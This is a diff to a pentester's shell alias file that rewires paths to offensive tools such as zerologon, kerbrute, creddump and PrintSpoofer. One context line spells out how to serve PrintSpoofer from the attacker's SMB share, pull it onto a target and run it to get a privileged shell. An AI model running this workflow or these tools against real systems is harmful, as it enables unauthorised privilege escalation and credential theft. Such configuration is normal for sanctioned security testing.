@@ -15,7 +15,8 @@ alias creddump='python3 /opt/infosec-tools/creddump7/pwdump.py'
 alias wes='python3 /opt/infosec-tools/wesng/wes.py'
 alias printspoofer='cp /opt/infosec-tools/printspoofer/PrintSpoofer.exe . && echo "Copied PrintSpoofer.exe in current directory ($(pwd)/PrintSpoofer.exe). Host it with: impacket-smbserver kali . (aliased to smbup) - Download it on target with: copy \\\\$(ip a s tun0 | grep -w inet | cut -d" " -f6 | cut -d"/" -f1)\kali\PrintSpoofer.exe .\PrintSpoofer.exe - Execute it with .\PrintSpoofer.exe -i -c cmd"'
 alias enum4linux-ng='/opt/infosec-tools/enum4linux-ng/enum4linux-ng.py'
-alias zerologon='/opt/infosec-tools/zerologon.py'
+alias zerologon='/opt/infosec-tools/zerologon/zerologon.py'
+alias kerbrute='/opt/infosec-tools/kerbrute/kerbrute_linux_amd64'
 
 alias autorecon='sudo autorecon --only-scans-dir'
 
